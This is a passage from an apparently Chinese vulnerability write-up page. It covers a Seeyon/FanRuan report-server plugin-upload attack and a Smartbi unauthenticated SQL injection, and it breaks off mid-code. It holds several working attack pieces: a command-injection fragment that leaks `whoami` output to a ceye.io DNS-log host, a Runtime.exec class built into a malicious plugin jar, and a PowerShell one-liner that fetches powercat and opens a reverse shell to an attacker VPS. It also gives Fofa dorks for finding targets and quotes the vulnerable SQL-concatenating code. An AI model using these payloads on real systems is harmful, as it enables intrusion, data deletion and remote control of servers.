`whoami`.linux.seeyonreport.ceyedoamin.ceye.io&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rt&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pc&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;commands&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;waitFor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;static&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;throws&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InterruptedException&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LocaleFinder&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;LocaleFinder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;复制LocaleFinder.class到
&lt;code&gt;\com.fr.plugin.external-1.3.4.zip\fr-plugin-external-1.3.4\fr-plugin-external-1.3.4.jar\com\fr\plugin\external\locale\&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;进入到插件管理界面, 上传符合规范的jar包插件即可
没生效就访问一下 &lt;code&gt;https://xxxx/seeyonreport/ReportServer?op=im&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;一般后台都是win, 可以直接使用powershell进行反弹shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;powershell IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c vps_ip -p 6666 -e cmd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.及时更新补丁&lt;/p&gt;
&lt;p&gt;2.使用waf拦截&lt;/p&gt;
&lt;h2 id=&#34;smartbi-前台sql注入&#34;&gt;Smartbi 前台SQL注入&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Smartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;
Smartbi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SmartBi&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;app=&amp;quot;Smartbi&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Smartbi软件SQL注入漏洞安全修复通报（厂商已修复）
&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;漏洞文件
&lt;code&gt;vision/userListManager.jsp&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;function doDel(){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   var ids = [];
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   // 全选
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   if($(&amp;#34;#checkAll&amp;#34;).checked){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      if(curRows){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         curRows.forEach(function(val, index){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            ids.push(val.id);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         });
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }else{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      if(curRows){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         $(&amp;#34;[name=&amp;#39;checkTr&amp;#39;]&amp;#34;).each(function(){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            if(this.checked){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               ids.push(this.id);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         });
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   if(ids &amp;amp;&amp;amp; ids.length &amp;gt; 0){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      if(!canOpt()){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         alert(&amp;#34;&amp;lt;%=StringUtil.getLanguageValue(&amp;#34;Youdonothavepermissiontodoso&amp;#34;)%&amp;gt;&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         return;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      var msg = &amp;#34;&amp;lt;%=StringUtil.getLanguageValue(&amp;#34;Suredelete?&amp;#34;)%&amp;gt;&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      var flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      alert(msg, &amp;#34;&amp;lt;%=StringUtil.getLanguageValue(&amp;#34;Removetips&amp;#34;)%&amp;gt;&amp;#34;, flags, function(ret) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         if (ret == modalWindow.ID_YES) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            var ret = jsloader.resolve(&amp;#34;freequery.common.util&amp;#34;).remoteInvokeEx2(&amp;#34;BIConfigService&amp;#34;, &amp;#34;delUsers&amp;#34;, [ids]);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            if(ret &amp;amp;&amp;amp; ret.result == 1){
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               alert(&amp;#34;&amp;lt;%=StringUtil.getLanguageValue(&amp;#34;Deletedsuccessfully&amp;#34;)%&amp;gt;&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               refresh();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      }, this);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }else{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      alert(&amp;#34;&amp;lt;%=StringUtil.getLanguageValue(&amp;#34;Noselectedobjectyouwanttodelete&amp;#34;)%&amp;gt;&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;smartbi/WEB-INF/lib/smartbi-BIConfig.jar!/smartbi/config/BIConfigService.class&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public int delUsers(List&amp;lt;String&amp;gt; ids) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    boolean succ = true;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    String idStr = &amp;#34;&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    if (ids != null &amp;amp;&amp;amp; ids.size() &amp;gt; 0) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        for(int i = 0; i &amp;lt; ids.size(); ++i) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            if (i == 0) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                idStr = &amp;#34;(&amp;#39;&amp;#34; + (String)ids.get(i) + &amp;#34;&amp;#39;&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            } else {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                idStr = idStr + &amp;#34;, &amp;#34; + &amp;#34;&amp;#39;&amp;#34; + (String)ids.get(i) + &amp;#34;&amp;#39;&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        idStr = idStr + &amp;#34;)&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Connection conn = null;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        PreparedStatement prep = null;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        Object rs = null;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        try {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            conn = DbUtil.getRepoConnection();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            conn.setAutoCommit(false);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            String sqlUser = &amp;#34;delete from t_user where c_userid in &amp;#34; + idStr;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            String sqlUserAttr = &amp;#34;delete from t_userattr where c_userid in &amp;#34; + idStr;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            String sqlUserconfig = &amp;#34;delete from t_userconfig where c_userid in &amp;#34; + idStr;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            String sqlUserRole = &amp;#34;delete from t_user_role where c_userid in &amp;#34; + idStr;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            String sqlUserGroup = &amp;#34;delete from t_group_user where c_userid in &amp;#34; + idStr;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep = conn.prepareStatement(sqlUser);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep.execute();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep = conn.prepareStatement(sqlUserAttr);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep.execute();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep = conn.prepareStatement(sqlUserconfig);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep.execute();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep = conn.prepareStatement(sqlUserRole);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep.execute();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep = conn.prepareStatement(sqlUserGroup);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            prep.execute();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            conn.commit();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        } catch (Exception var17) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            try {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                succ = false;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                conn.rollback();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            } catch (SQLException var16) {
